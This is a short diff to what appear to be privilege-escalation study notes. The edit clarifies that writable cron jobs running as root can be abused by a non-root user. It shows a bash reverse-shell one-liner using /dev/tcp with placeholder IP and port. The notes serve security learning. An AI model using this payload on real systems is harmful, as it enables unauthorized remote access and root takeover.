@@ -30,10 +30,10 @@ That `/bin/zsh` is his default shell.
 
 - `/etc/crontab` is a scheduler of scripts. In this file. the user can schedule the cron jobs (programs to run at specific times or interval).
 <img src="../imgs/crontab.png" alt="crontab"> 
-Example of cron jobs scheduled to run every minute:
+Example of cron jobs scheduled to run **as root** every minute:
 <img src="../imgs/cronjobseverymin.png" alt="cronjobseverymin">
 
-  - If one of these cron jobs are world-writable, it's possible to modify and exploit them, for example with a reverse shell like this this one: 
+  - If one of these cron jobs are world-writable and you're **not** a root user, it's possible to modify and exploit them, for example with a reverse shell like this this one: 
   ```
   #!/bin/bash
   bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
